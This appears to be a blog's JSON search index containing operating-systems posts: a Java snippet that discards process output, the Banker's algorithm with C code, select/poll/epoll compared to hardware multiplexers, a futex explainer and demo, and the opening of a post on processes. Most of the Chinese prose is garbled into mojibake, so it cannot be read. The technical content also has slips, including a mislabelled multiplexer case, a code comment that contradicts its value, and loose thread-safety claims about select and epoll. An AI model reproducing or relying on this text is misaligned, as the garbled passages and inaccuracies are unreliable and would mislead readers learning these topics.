","ç”¨åœ¨ä½•å¤„#ç”¨åœ¨ä½•å¤„ï¼Ÿ":" java æ‰§è¡Œå¤–éƒ¨çš„å‘½ä»¤, ä½†æ˜¯ä¸éœ€è¦å¤–éƒ¨å‘½ä»¤çš„æ‰§è¡Œç»“æœ. ç›´æ¥ä¸¢å¼ƒ stdout, stderr.\nimport java.io.*; public class DiscardProcessOutput { public static void main(String[] args) { try { // Create the ProcessBuilder with the command to run ProcessBuilder processBuilder = new ProcessBuilder(\"someCommand\"); // Merge stdout and stderr and redirect them to /dev/null (or NUL in Windows) processBuilder.redirectErrorStream(true); if (System.getProperty(\"os.name\").contains(\"Windows\")) { processBuilder.redirectOutput(new File(\"NUL\")); } else { processBuilder.redirectOutput(new File(\"/dev/null\")); } // Start the process Process process = processBuilder.start(); // Wait for the process to finish int exitCode = process.waitFor(); System.out.println(\"Process exited with code: \" + exitCode); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } } "},"title":"Null Device"},"/blog/os-banker-s-algorithm/":{"data":{"":"","bankers-algorithm#Banker\u0026rsquo;s Algorithm":"Bankerâ€™s Algorithm é“¶è¡Œå®¶ç®—æ³•æ˜¯ä»€ä¹ˆ é“¶è¡Œå®¶ä¸»è¦å°±æ˜¯é€šè¿‡æ”¾è´·æ¥èµšé’±çš„ã€‚é‚£æœ€é‡è¦çš„é—®é¢˜æ˜¯å•¥ï¼Ÿå½“ç„¶æ˜¯æŠŠé’±å€Ÿç»™è¿˜å¾—èµ·çš„äººå’¯ã€‚è¯•æƒ³ï¼Œé“¶è¡ŒæŠŠé’±éƒ½å€Ÿç»™äº†è¿˜ä¸èµ·çš„äººï¼Œé‚£é“¶è¡Œå°±å®Œè›‹äº†ã€‚å‡è®¾æœ‰ä¸€æ‰¹äººï¼ˆå¤šä¸ªè¿›ç¨‹ï¼‰æ¥å€Ÿé’±ï¼ˆå°†è¦ç”³è¯·èµ„æºï¼‰ï¼Œä½†æ˜¯é“¶è¡Œå‰©ä¸‹çš„é’±æ»¡è¶³ä¸äº†ä»»ä½•äººï¼Œé‚£å°±ç›´æ¥æ‹’ç»å€Ÿè´·ã€‚å½“ç„¶äº†ï¼Œæœ‰ä¸€éƒ¨åˆ†å·²ç»å€Ÿå‡ºçš„é’±å›æ”¶ä¹‹åï¼ˆå›æ”¶å·²ç»åˆ†é…çš„èµ„æºï¼‰ï¼Œåˆå¯ä»¥æ»¡è¶³ä¸€æ‰¹äººä¸­æŸäº›äººçš„å€Ÿè´·éœ€æ±‚ã€‚ä¾æ¬¡ç±»æ¨ï¼Œé“¶è¡Œå¯ä»¥åˆ¤å®šèƒ½ä¸èƒ½æŒ‰ç…§æŸä¸ªé¡ºåºæ¥ç»™è¿™æ‰¹äººæ”¾è´·ã€‚ç±»ä¼¼çš„æ€è·¯å»¶ä¼¸åˆ°è®¡ç®—æœºä¸–ç•Œï¼ŒåŒç†ã€‚æ“ä½œç³»ç»Ÿç»™å¤šä¸ªè¿›ç¨‹åˆ†é…èµ„æºï¼Œèƒ½ä¸èƒ½æ‰¾åˆ°ä¸€ä¸ªé¡ºåºç»™è¿™äº›è¿›ç¨‹åˆ†é…èµ„æºï¼Œå¹¶é€æ¸å›æ”¶èµ„æºï¼Ÿä»è€Œæ»¡è¶³å¤šä¸ªè¿›ç¨‹çš„èµ„æºéœ€æ±‚ã€‚é‡‡ç”¨é“¶è¡Œå®¶æ”¾è´·å’Œæ”¶è´·çš„æ€è·¯ï¼ˆè¿™é‡Œæ’é™¤åˆ©æ¯ï¼Œæ”¾å¤šå°‘è´·ï¼Œæ”¶å¤šå°‘é’±ã€‚å‘µå‘µï¼Œå“ªæœ‰æ­¤ç§å¥½äº‹ï¼Ÿï¼‰æ¥åˆ†é…å’Œå›æ”¶ç³»ç»Ÿèµ„æºå°±æ˜¯æ‰€è°“çš„é“¶è¡Œå®¶ç®—æ³•ã€‚\né“¶è¡Œå®¶ç®—æ³•è§£å†³ä»€ä¹ˆé—®é¢˜ resource allocation and deadlock avoidance algorithmã€‚é“¶è¡Œå®¶ç®—æ³•ç”¨æ¥è¿›è¡Œèµ„æºåˆ†é…å’Œé¿å…æ­»é”ã€‚\né“¶è¡Œå®¶ç®—æ³•æ€æ ·è§£å†³é—®é¢˜ P0ã€P1ã€P2ã€P3ã€P4 5ä¸ªè¿›ç¨‹ï¼Œè§†ä¸ºéœ€è¦é’±çš„ 5 ä¸ªäººã€‚ Aã€Bã€C ä¸‰ç§ç³»ç»Ÿèµ„æºã€‚åˆ†åˆ«è§†ä¸ºæ˜¯é“¶è¡Œä¸‰ç§è´µé‡‘å±ï¼šé‡‘å—ã€é“¶å—ã€é“œå—ã€‚\nallocation table å·²æ”¾è´·è¡¨ æ¯ä¸ªäººå·²ç»å€Ÿçš„é‡‘é“¶é“œä¸ªæ•°åˆ—è¡¨\nA B C P0 0 1 0 P1 2 0 0 P2 3 0 2 P3 2 1 1 P4 0 0 2 max table æœ€å¤§å€Ÿè´·è¡¨ æ¯ä¸ªäººéœ€è¦é‡‘é“¶é“œæœ€å¤§ä¸ªæ•°åˆ—è¡¨\nA B C P0 7 5 3 P1 3 2 2 P2 9 0 2 P3 2 2 2 P4 4 3 3 need table è¿˜éœ€æ”¾è´·è¡¨ æ¯ä¸ªäººè¿˜éœ€è¦çš„é‡‘é“¶é“œä¸ªæ•°åˆ—è¡¨ã€‚ç”± max table - allocation table å¾—åˆ°ã€‚\nA B C P0 7 4 3 P1 1 2 2 P2 6 0 0 P3 0 1 1 P4 4 3 1 available table å‰©ä½™èµ„æºè¡¨ é“¶è¡Œè¿˜å‰©ä¸‹çš„é‡‘é“¶é“œä¸ªæ•°ã€‚\nA B C 3 3 2 å‰©ä½™ç³»ç»Ÿèµ„æºåˆ†é…é¡ºåºæ¨æ¼” æ‹¿ç€ available table ï¼ˆå‰©ä½™èµ„æºè¡¨ï¼‰ï¼Œåˆ° need tableï¼ˆè¿˜éœ€æ”¾è´·è¡¨ï¼‰ æ¯”å¯¹ã€‚è‹¥ available table çš„ A B C æ»¡è¶³ need table çš„æŸä¸€è¡Œï¼ˆä¹Ÿå°±æ˜¯ available table æ¯ä¸€åˆ—éƒ½å¤§äºç­‰äº need table çš„æŸä¸€è¡Œçš„æ¯ä¸€åˆ—ï¼‰ã€‚è¯´æ˜å¯ä»¥åˆ†é…ç»™è¿™ä¸ªè¿›ç¨‹ï¼Œæ ‡è®°è¿™ä¸€è¡Œã€‚åŒæ—¶å›æ”¶è¿™ä¸€è¡Œå¯¹åº”çš„ allocation table ä¸­å·²ç»åˆ†é…çš„ A B Cã€‚æ›´æ–° available table çš„ A B Cã€‚ä»¥æ­¤ç±»æ¨ï¼Œç»§ç»­æ¯”å¯¹ need table ä¸­å…¶ä»–æœªæ ‡è®°çš„è¡Œã€‚è‹¥æœ€å need table æ‰€æœ‰è¡Œéƒ½æœ‰æ ‡è®°ï¼Œè¯´æ˜å­˜åœ¨ä¸€ä¸ªç»™ P0ã€P1ã€P2ã€P3ã€P4 è¿›ç¨‹åˆ†é…èµ„æºçš„é¡ºåºã€‚ æ‹¿ç€ available table å‰©ä½™èµ„æºè¡¨ï¼Œä¸æ»¡è¶³ need table ä¸­ä»»ä½•ä¸€è¡Œã€‚è¯´æ˜ä¸å­˜åœ¨ä¸€ä¸ªç»™ P0ã€P1ã€P2ã€P3ã€P4 è¿›ç¨‹åˆ†é…èµ„æºçš„é¡ºåºã€‚ç³»ç»Ÿæœ‰å¯èƒ½è¿›å…¥æ­»é”ã€‚ é“¶è¡Œå®¶ç®—æ³•å›¾è§£åˆ†æ å­˜åœ¨çš„ä¸€ä¸ªåºåˆ— P1 -\u003e P3 -\u003e P4 -\u003e P0 -\u003e P2\næœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•è§£å†³æ­¤é—®é¢˜ Bankerâ€™s Algorithm implemention // Banker's Algorithm #include \u003cstdio.h\u003e int main() { // P0, P1, P2, P3, P4 are the Process names here int n, m, i, j, k; n = 5; // Number of processes m = 3; // Number of resources int alloc[5][3] = { { 0, 1, 0 }, // P0 // Allocation Matrix { 2, 0, 0 }, // P1 { 3, 0, 2 }, // P2 { 2, 1, 1 }, // P3 { 0, 0, 2 } }; // P4 int max[5][3] = { { 7, 5, 3 }, // P0 // MAX Matrix { 3, 2, 2 }, // P1 { 9, 0, 2 }, // P2 { 2, 2, 2 }, // P3 { 4, 3, 3 } }; // P4 int avail[3] = { 3, 3, 2 }; // Available Resources int finished[n], ans[n], index = 0; for (k = 0; k \u003c n; k++) { finished[k] = 0; } int need[n][m]; for (i = 0; i \u003c n; i++) { for (j = 0; j \u003c m; j++) // è®¡ç®— need matrix need[i][j] = max[i][j] - alloc[i][j]; } int y = 0; for (k = 0; k \u003c 5; k++) { for (i = 0; i \u003c n; i++) { if (finished[i] == 0) { int flag = 0; for (j = 0; j \u003c m; j++) { if (need[i][j] \u003e avail[j]){ flag = 1; break; } } if (flag == 0) { ans[index++] = i; for (y = 0; y \u003c m; y++) avail[y] += alloc[i][y]; finished[i] = 1; } } } } printf(\"Following is the SAFE Sequence\\n\"); for (i = 0; i \u003c n - 1; i++) printf(\" P%d -\u003e\", ans[i]); printf(\" P%d\", ans[n - 1]); return (0); } ","references#References":" é“¶è¡Œå®¶ç®—æ³•-wiki bankers-algorithm "},"title":"os-banker's-algorithm"},"/blog/select-poll-epoll/":{"data":{"":" å¼„æ¸…æ¥š I/O Multiplexing å’Œ Linux ä¸­ select, poll, epoll ä¹‹é—´çš„å…³ç³».","io-multiplexing#I/O Multiplexing":" I/O multiplexing è¿™é‡Œé¢çš„ multiplexing æŒ‡çš„å…¶å®æ˜¯åœ¨å•ä¸ªçº¿ç¨‹é€šè¿‡è®°å½•è·Ÿè¸ªæ¯ä¸€ä¸ª Sock(I/O æµ)çš„çŠ¶æ€. select, poll, epoll éƒ½æ˜¯ I/O multiplexingçš„å…·ä½“çš„å®ç°, ä¹‹æ‰€ä»¥æœ‰è¿™ä¸‰ä¸ªå­˜åœ¨ï¼Œå…¶å®æ˜¯ä»–ä»¬å‡ºç°æ˜¯æœ‰å…ˆåé¡ºåºçš„.","io-multiplexing-å’Œ-multiplexer#I/O Multiplexing å’Œ Multiplexer":" I0, I1, I2, I3 è§†ä¸º 4 ä¸ª I/O æµ. å€¼ä¸º 1 æ—¶, è§†ä¸ºä¸€ä¸ª I/O æµ. 4x1 Multiplexer ä½œä¸ºç¡¬ä»¶å®ç°çš„ I/O multiplexing. å¯ä»¥å‘¨æœŸæ€§çš„è®¾ç½®S1 å’Œ S0 çš„å€¼, é€šè¿‡ç›‘æµ‹ Y çš„è¾“å‡º, å¾—åˆ° I0, I1, I2, I3 çš„è¾“å…¥. {% asset_img multiplexers_S1_S0_I0.png multiplexers_S1_S0_I0 %}\nselect select è¢«å®ç°ä»¥å, å¾ˆå¿«å°±æš´éœ²å‡ºäº†å¾ˆå¤šé—®é¢˜.\nselect ä¼šä¿®æ”¹ä¼ å…¥çš„å‚æ•°æ•°ç»„, è¿™ä¸ªå¯¹äºä¸€ä¸ªéœ€è¦è°ƒç”¨å¾ˆå¤šæ¬¡çš„å‡½æ•°, æ˜¯éå¸¸ä¸å‹å¥½çš„. select å¦‚æœä»»ä½•ä¸€ä¸ª sock(I/O stream) å‡ºç°äº†æ•°æ®, select ä»…ä»…ä¼šè¿”å›, ä½†æ˜¯å¹¶ä¸ä¼šå‘Šè¯‰ä½ æ˜¯é‚£ä¸ª sock ä¸Šæœ‰æ•°,äºæ˜¯ä½ åªèƒ½è‡ªå·±ä¸€ä¸ªä¸€ä¸ªçš„æ‰¾. ç›¸å½“äºç›‘æµ‹åˆ° Mutiplexer çš„ Y = 1, ä½†æ˜¯ä¸çŸ¥é“ I0, I1, I2, I3å“ªä¸€ä¸ªçš„è¾“å…¥æ˜¯ 1. ä¹Ÿå°±æ˜¯ä¸å‘Šè¯‰ S1 å’Œ S0çš„å€¼, é‚£å°±åªå¥½å†å»å…·ä½“æŸ¥çœ‹ä¸€æ¬¡. I0, I1, I2, I3çš„å€¼.\nselect åªèƒ½ç›‘è§† 1024 ä¸ªé“¾æ¥. ç›¸å½“äºå®ç°äº†ä¸€ä¸ª 1024x1 çš„ Mutiplexer. åªèƒ½æœ‰1024 ä¸ªè¾“å…¥. select ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„. poll ä¿®å¤ç‰ˆçš„ select\npoll å»æ‰äº† 1024 ä¸ªé“¾æ¥çš„é™åˆ¶ epoll epoll å¯ä»¥è¯´æ˜¯ I/O å¤šè·¯å¤ç”¨æœ€æ–°çš„ä¸€ä¸ªå®ç°, epoll ä¿®å¤äº† poll å’Œ select ç»å¤§éƒ¨åˆ†é—®é¢˜, æ¯”å¦‚:\nepoll ç°åœ¨æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ epoll ç°åœ¨ä¸ä»…å‘Šè¯‰ä½  sock ç»„é‡Œé¢æ•°æ®ï¼Œè¿˜ä¼šå‘Šè¯‰ä½ å…·ä½“å“ªä¸ª sock æœ‰æ•°æ®, ä½ ä¸ç”¨è‡ªå·±å»æ‰¾äº†. ç›¸å½“äºç›‘æµ‹åˆ° Mutiplexer çš„ Y = 1, ä¸”å‘ŠçŸ¥äº†æ­¤æ—¶çš„ S1 å’Œ S0 çš„å€¼, é€šè¿‡ç»„åˆå°±å¯ä»¥çŸ¥é“æ˜¯å“ªä¸€ä¸ªå…·ä½“çš„è¾“å…¥æ˜¯ 1 äº†.","multiplexer#multiplexer":" Multiplexer is a combinational circuit that has maximum of 2^n data inputs, n selection lines and single output line. One of these data inputs will be connected to the output based on the values of selection lines. Since there are n selection lines, there will be 2^n possible combinations of zeros and ones. So, each combination will select only one data input. Multiplexer is also called as Mux. èšåˆå¤šä¸ªè¾“å…¥, é€šè¿‡ selection lines æ¥é€‰æ‹©ä¸€ä¸ªè¾“å‡º.\n4x1 Multiplexer åˆ†æ èšåˆ I0, I1, I2, I3 è¿™ 4 ä¸ªè¾“å…¥, é€šè¿‡ S1 å’Œ S0 æ¥é€‰æ‹©ä¸€ä¸ªè¾“å‡º.\nBlock diagram of 4x1 Multiplexer Y(output) è¾“å‡ºå€¼çš„åˆ†æ S1 = 0, S0 = 0 æ—¶ Y çš„å€¼ç”± I0 å†³å®š S1 = 0, S0 = 0. æ­¤æ—¶çš„ I1, I2, I3, æ— è®ºæ˜¯ 0 è¿˜æ˜¯ 1, å¯¹åº”çš„ and gate è¾“å‡ºéƒ½æ˜¯ 0, å¯¹æœ€ç»ˆè¾“å‡º Y æ²¡æœ‰å½±å“. æ­¤æ—¶ I0 çš„è¾“å…¥å†³å®š Y çš„å€¼. ä¹Ÿå°±æ˜¯ Y = I0.\nS1 = 0, S0 = 1 æ—¶ Y çš„å€¼ç”± I1 å†³å®š S1 = 0, S0 = 1. æ­¤æ—¶çš„ I0, I2, I3, æ— è®ºæ˜¯ 0 è¿˜æ˜¯ 1, å¯¹åº”çš„ and gate è¾“å‡ºéƒ½æ˜¯ 0, å¯¹æœ€ç»ˆè¾“å‡º Y æ²¡æœ‰å½±å“. æ­¤æ—¶ I1 çš„è¾“å…¥å†³å®š Y çš„å€¼. ä¹Ÿå°±æ˜¯ Y = I1.\nS1 = 1, S0 = 0 æ—¶ Y çš„å€¼ç”± I2 å†³å®š S1 = 1, S0 = 0. æ­¤æ—¶çš„ I0, I1, I3, æ— è®ºæ˜¯ 0 è¿˜æ˜¯ 1, å¯¹åº”çš„ and gate è¾“å‡ºéƒ½æ˜¯ 0, å¯¹æœ€ç»ˆè¾“å‡º Y æ²¡æœ‰å½±å“. æ­¤æ—¶ I2 çš„è¾“å…¥å†³å®š Y çš„å€¼. ä¹Ÿå°±æ˜¯ Y = I2.\nS1 = 1, S1 = 0 æ—¶ Y çš„å€¼ç”± I3 å†³å®š S1 = 1, S0 = 1. æ­¤æ—¶çš„ I0, I1, I2, æ— è®ºæ˜¯ 0 è¿˜æ˜¯ 1, å¯¹åº”çš„ and gate è¾“å‡ºéƒ½æ˜¯ 0, å¯¹æœ€ç»ˆè¾“å‡º Y æ²¡æœ‰å½±å“. æ­¤æ—¶ I3 çš„è¾“å…¥å†³å®š Y çš„å€¼. ä¹Ÿå°±æ˜¯ Y = I3.\nTruth table of 4x1 Multiplexer S1(é«˜ä½) S0(ä½ä½) S1S0(å€¼) Y 0 0 0 I0 0 1 1 I1 1 0 2 I2 1 1 3 I3 Multiplexer (Mux) 4x1 Multiplexer ç›¸å½“äºæä¾›äº†ä¸€ç§æ˜ å°„, Y = I(S1S0). é€šè¿‡ç»„åˆS1 å’Œ S0 çš„å€¼, å¯ä»¥ç›´æ¥å¾—åˆ° IS1S0 çš„å€¼.ä¹Ÿå°±æ˜¯é€šè¿‡ 4x1 Multiplexer è¾“å‡ºçš„ Y å€¼æ˜¯ I0, I1, I2, I3 ä¹‹ä¸€.","references#References":" circuits_multiplexers circuits_demultiplexers epollçš„æœ¬è´¨ I/O multiplexing "},"title":"select_poll_epoll"},"/blog/syscall-futex/":{"data":{"":"","futex-balancing-userkernel-responsibilities#\u003cstrong\u003eFutex: Balancing User/Kernel Responsibilities\u003c/strong\u003e":"","how-futex-works#\u003cstrong\u003eHow Futex Works?\u003c/strong\u003e":"","ä»€ä¹ˆæƒ…å†µä¼šå‘ç”Ÿ-spurious-wakeups#\u003cstrong\u003eä»€ä¹ˆæƒ…å†µä¼šå‘ç”Ÿ Spurious Wakeups?\u003c/strong\u003e":"Futex (Fast Userspace Mutex)\nA futex is a Linux kernel system call that provides a fast and efficient mechanism for implementing user-space synchronization primitives, such as mutexes, semaphores, and condition variables. It minimizes kernel involvement in uncontended cases, reducing overhead by handling synchronization in userspace when possible.\nFutexes split synchronization into user-space atomics (fast) and kernel-assisted blocking (slow), optimizing for the common case. The boundary is enforced by hardware (CPU modes) and the need for kernel-managed resources (scheduling, interrupts).\nHow Futex Works? æ²¡æœ‰ç«äº‰ï¼ŒCAS åç›´æ¥è·å–é”ï¼Œä¸æ¶‰åŠåˆ° syscall æœ‰ç«äº‰, futex_wait è®©çº¿ç¨‹ sleep, ç­‰å¾…å…¶ä»–çº¿ç¨‹ futex_wake å”¤é†’ å¤§å¤šæ•°æ—¶å€™æ˜¯æ²¡æœ‰ç«äº‰çš„ï¼Œæ‰€ä»¥å°±å‡å°‘äº†å†…æ ¸çš„å¹²é¢„ã€‚\nfutex è®¾è®¡åŸåˆ™ Avoid Kernel Calls When Possible Use atomic operations for uncontended cases (fast path). Only call the kernel when blocking is required (slow path). Kernel as a Backstop The kernel handles complex tasks like: Managing wait queues. Guaranteeing fairness/priority in thread wakeup. Handling signals/interrupts during blocking. Spurious Wakeups The kernel may wake threads even if the futex value hasnâ€™t changed (e.g., due to signals). User-space must recheck the futex value after wakeup (e.g., loop in lock()). ä¸ºå•¥éœ€è¦å‡å°‘å†…æ ¸çš„å¹²é¢„? Kernel calls (system calls) are expensive compared to user-space operations.\nContext Switch Overhead When a thread enters the kernel (e.g., via syscall), the CPU must: Save user-space registers. ä¿å­˜ç”¨æˆ·ç©ºé—´å¯„å­˜å™¨ Switch to kernel mode (privileged CPU state). CPU æ¨¡å¼åˆ‡æ¢åˆ°ç‰¹æƒæ¨¡å¼ Run kernel code (e.g., scheduler, wait queues). æ‰§è¡Œå†…æ ¸ä»£ç ï¼Œæ¯”å¦‚è°ƒåº¦å™¨ Restore user-space state afterward. æ¢å¤ç”¨æˆ·ç©ºé—´å¯„å­˜å™¨ This process takes hundreds to thousands of CPU cycles, adding latency. Scalability Frequent kernel calls create contention in the kernelâ€™s internal data structures (e.g., locks for process/thread management). Kernel resources are shared across all processes, so overuse hurts overall system performance. æ‰€æœ‰è¿›ç¨‹å…±äº«å†…æ ¸èµ„æº Fast-Path Optimization Most synchronization operations (e.g., locking a mutex) are uncontended (no other thread holds the lock). Handling these cases purely in user-space avoids kernel interaction entirely. User Space and Kernel è¾¹ç•Œ The boundary is defined by CPU privilege levels and the need for kernel-managed resources:\nUser Space Kernel Space Runs in unprivileged CPU mode (ring 3). Runs in privileged CPU mode (ring 0). Directly manipulates user memory. Manages hardware, interrupts, scheduling. Uses atomic CPU instructions (e.g., cmpxchg). Uses system calls (e.g., futex, sched_yield). Handles â€œfast pathâ€ (uncontended case). Manages â€œslow pathâ€ (blocking/waking threads). Futex: Balancing User/Kernel Responsibilities futex æ¨ªè·¨ user/kernel ä¸¤ä¸ªç©ºé—´\nUser-Space Fast Path (No Contention) Atomic Compare-and-Swap (CAS): atomic_compare_exchange_strong(\u0026futex, 0, 1); // Pure user-space If the lock is free (futex == 0), the thread acquires it without involving the kernel. This is a single CPU instruction (e.g., lock cmpxchg on x86), blazing fast. Kernel Slow Path (Contention) Blocking with FUTEX_WAIT syscall(SYS_futex, \u0026futex, FUTEX_WAIT, 1, ...); If the lock is held (futex == 1), the thread asks the kernel to block it until the lock is freed. The kernel adds the thread to a wait queue and schedules other threads. Waking with FUTEX_WAKE syscall(SYS_futex, \u0026futex, FUTEX_WAKE, 1, ...); On unlock, the kernel wakes one blocked thread. This involves scheduler logic (kernel responsibility). Futex ä¸»è¦æ“ä½œ FUTEX_WAIT: Puts the calling thread to sleep if the futex word matches the expected value. If *uaddr == val, the thread goes to sleep (blocks). If *uaddr != val, the call returns immediately with EAGAIN. If a timeout is set, the thread may also wake up due to timeout (ETIMEDOUT). FUTEX_WAKE: Wakes up a specified number of threads waiting on the futex. FUTEX_WAIT_BITSET / FUTEX_WAKE_BITSET: Advanced operations for conditional waits using bitmasks (e.g., for condition variables). å·¥ä½œæµç¨‹ç¤ºä¾‹ Thread A acquires the lock:\nCAS succeeds in user space (futex becomes 1). No kernel interaction. Thread B tries to acquire the lock:\nCAS fails (futex is 1). Calls FUTEX_WAIT to block (kernel involvement). Thread A releases the lock:\nSets futex to 0 (user space). Calls FUTEX_WAKE to unblock Thread B (kernel). Why This Matters in Practice? Performance: A futex-based mutex can be 10â€“100x faster than a traditional kernel-only mutex under low contention. Scalability: Reduces kernel lock contention in highly parallel workloads (e.g., databases, game engines). Flexibility: User-space can implement custom synchronization logic (e.g., adaptive mutexes, read/write locks). Core Concept:\nA futex word (a 32-bit integer in shared memory) acts as the synchronization variable. å’Œå¹³å°æ— å…³, éƒ½æ˜¯ 32bit Threads use atomic operations (e.g., compare-and-swap) to manipulate this word in userspace. Kernel intervention occurs only during contention (e.g., when a thread must wait). Acquiring a Lock (Uncontended Case):\nA thread attempts to atomically set the futex word from 0 (unlocked) to 1 (locked). If successful, the lock is acquired without a system call. Acquiring a Lock (Contended Case):\nIf the lock is already held (futex_word == 1), the thread calls futex_wait(\u0026futex_word, 1) to block. The kernel checks if the futex word is still 1 and puts the thread to sleep, avoiding race conditions. Releasing a Lock:\nThe thread sets the futex word back to 0 atomically. It then calls futex_wake(\u0026futex_word, 1) to wake up one waiting thread. Handling Spurious Wakeups:\nAfter waking, threads re-check the futex word to ensure the lock is available before proceeding. ä¾‹å­ç†è§£ futex_demo.c#include \u003clinux/futex.h\u003e #include \u003csys/syscall.h\u003e #include \u003cunistd.h\u003e #include \u003cstdio.h\u003e #include \u003cpthread.h\u003e // Futex word (shared between threads) int futex_var = 0; // 0 = unlocked, 1 = locked // Wrapper for futex_wait syscall void futex_wait(int* uaddr, int val) { syscall(SYS_futex, uaddr, FUTEX_WAIT, val, NULL, NULL, 0); } // Wrapper for futex_wake syscall void futex_wake(int* uaddr) { syscall(SYS_futex, uaddr, FUTEX_WAKE, 1, NULL, NULL, 0); } // Thread function with custom sleep time void* thread_func(void* arg) { int sleep_time = *(int*)arg; // Cast void* to int* // Try to acquire lock (using GCC atomic compare-and-swap) int expected = 0; while (!__sync_bool_compare_and_swap(\u0026futex_var, 0, 1)) { // Contended case: wait for wakeups printf(\"Thread %lu acquired the lock failed\\n\", pthread_self()); futex_wait(\u0026futex_var, 1); } // Critical section (simulate work with custom sleep) printf(\"Thread %lu acquired the lock success, sleeping for %d seconds\\n\", pthread_self(), sleep_time); sleep(sleep_time); // Customizable sleep duration // Release lock futex_var = 0; futex_wake(\u0026futex_var); return NULL; } int main() { // Define sleep durations for each thread int sleep1 = 5; // First thread sleeps for 1 second int sleep2 = 3; // Second thread sleeps for 3 seconds int sleep3 = 2; // Create threads pthread_t t1, t2, t3; printf(\"%p\\n\",\u0026futex_var); pthread_create(\u0026t1, NULL, thread_func, \u0026sleep1); pthread_create(\u0026t2, NULL, thread_func, \u0026sleep2); pthread_create(\u0026t3, NULL, thread_func, \u0026sleep3); // Wait for threads to finish pthread_join(t1, NULL); pthread_join(t2, NULL); pthread_join(t3, NULL); return 0; } gcc -g -pthread -std=gnu11 futex_demo.c -o futex_demo\nä»€ä¹ˆæ˜¯ Spurious Wakeup? A spurious wakeup occurs when a thread waiting on a synchronization primitive (e.g., a condition variable, futex, or semaphore) wakes up without being explicitly signaled or broadcasted. This means the thread resumes execution even though no other thread modified the condition it was waiting for.\nSpurious wakeups are not errors in the system. they are a design trade-off in low-level synchronization mechanisms like futexes to avoid unnecessary overhead in kernel-space implementations.\nä¸ºå•¥éœ€è¦ spurious Wakeups? spurious wakeups are allowed for performance and implementation efficiency, particularly in systems like Linux futexes.\nä¸ºäº†æ€§èƒ½å’Œé«˜æ•ˆçš„å®ç°éœ€è¦ spurious wakeups\n1. Kernel Optimization The Linux kernel uses shared data structures (e.g., wait queues) for threads waiting on a futex. If multiple threads are waiting on the same futex word, the kernel may wake up more than one thread (even if only one is needed) to reduce contention and latency. This avoids the overhead of tracking exactly which thread should wake up. 2. Signal Handling A thread waiting on a futex may be interrupted by a signal (e.g., SIGINT, SIGALRM). The kernel wakes up the thread to handle the signal, even if the futex condition hasnâ€™t changed. 3. Hardware/Architecture Constraints Some architectures or hardware may not guarantee atomicity between checking the condition and sleeping, leading to race conditions that require re-checking after waking. ä»€ä¹ˆæƒ…å†µä¼šå‘ç”Ÿ Spurious Wakeups? Scenario Description Multiple Waiters When many threads wait on the same futex, the kernel may wake multiple threads (e.g., via FUTEX_WAKE) even if only one is needed. å¤šä¸ªç­‰å¾…åŒä¸€ä¸ª futex çš„çº¿ç¨‹, è¢« os ä¸€å¹¶å”¤é†’, ä½†æœ€ç»ˆåªæœ‰ä¸€ä¸ªè·å– futex Signal Interruption A thread is interrupted by a signal (e.g., Ctrl+C), causing it to wake up prematurely.\nè™½ç„¶è¿›ç¨‹ sleep äº†, ä½†æ˜¯ä»å¯ä»¥è¢« os å”¤é†’å¤„ç†ä¿¡å· Timeout Expiration If a timeout is set (e.g., FUTEX_WAIT_BITSET with a timeout), the thread may wake up due to the timeout, even if the condition hasnâ€™t changed. è®¾ç½®äº†è¶…æ—¶, è¶…æ—¶åå¯ä»¥è¢« os å”¤é†’ Kernel Preemption In high-load scenarios, the kernel may preempt a waiting thread for scheduling reasons. è¢« os æŠ¢å è°ƒåº¦å”¤é†’ å¦‚ä½•å¤„ç† Spurious Wakeups? To handle spurious wakeups correctly, always re-check the condition after waking up. This is a fundamental rule in concurrent programming.\nä¾‹å­1 é‡æ–°æ£€æŸ¥æ¡ä»¶ // Shared futex word (0 = unlocked, 1 = locked) int futex_var = 0; // Thread attempts to acquire the lock while (!__sync_bool_compare_and_swap(\u0026futex_var, 0, 1)) { // Wait for wakeups if futex_var is still 1 futex_wait(\u0026futex_var, 1); } Hereâ€™s what happens:\nIf futex_wait returns due to a spurious wakeup, the thread re-checks the condition (futex_var == 1) in the loop. If the condition is still true, the thread calls futex_wait again. If the condition is now false (e.g., another thread released the lock), the thread proceeds. ä¾‹å­2 é‡æ–°æ£€æŸ¥æ¡ä»¶ pthread_mutex_lock(\u0026mutex); while (!condition_met) { pthread_cond_wait(\u0026cond, \u0026mutex); // Releases mutex, waits for signal } // Re-check condition here (spurious wakeups handled by the loop) pthread_mutex_unlock(\u0026mutex); The while loop ensures that spurious wakeups are harmless.\nWhy Not Prevent Spurious Wakeups? Preventing spurious wakeups would require strict guarantees from the kernel or library, which could introduce significant overhead. For example:\nTracking exactly which thread should wake up (e.g., via a queue). Adding memory barriers or locks to ensure atomicity between checking and sleeping. By allowing spurious wakeups, systems like futexes remain lightweight and scalable for high-performance applications.","ä»€ä¹ˆæ˜¯-spurious-wakeup#\u003cstrong\u003eä»€ä¹ˆæ˜¯ Spurious Wakeup?\u003c/strong\u003e":""},"title":"Syscall Futex"},"/blog/three-easy-pieces-4-process/":{"data":{"":" æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªè®¡ç®—æœº CPU æ•°é‡æœ‰é™, ä½†æ˜¯å´å¯ä»¥åŒæ—¶è·‘æ•°é‡è¿œè¿œå¤šäº CPU æ•°é‡çš„ç¨‹åº. å…¶å®è¿™å°±æ˜¯ virtualizing. æ€æ ·è¿›è¡Œ CPU è™šæ‹ŸåŒ–å‘¢? é€šè¿‡æŠ½è±¡å‡º process è¿™ä¸ªåŸºæœ¬æ¦‚å¿µ, ä¹Ÿå°±æ˜¯ running program. ä¸€ä¸ªæ²¡æœ‰è¿è¡Œçš„ç¨‹åº, ä¹Ÿå°±æ˜¯ç£ç›˜ä¸Šçš„ä¸€å †æŒ‡ä»¤é›†å’Œä¸€äº›æ•°æ®. é€šè¿‡ time sharing è®©ä¸€ä¸ª process stop, ç„¶åå» run å¦å¤–ä¸€ä¸ª process. é‡å¤è¿™ä¸ª context switch è¿‡ç¨‹, å¯ä»¥è®©å¤šä¸ªç¨‹åºåŒæ—¶è¿è¡Œ, è¿™å°±æ˜¯åœ¨virtualizing CPU. mechanisms are low-level methods or protocols that implements a needed piece of functionality. ç±»ä¼¼äº java ä¸­çš„æ¥å£, å°±æ˜¯æˆ‘è¦æä¾›ä»€ä¹ˆåŠŸèƒ½. æ¯”å¦‚ OS 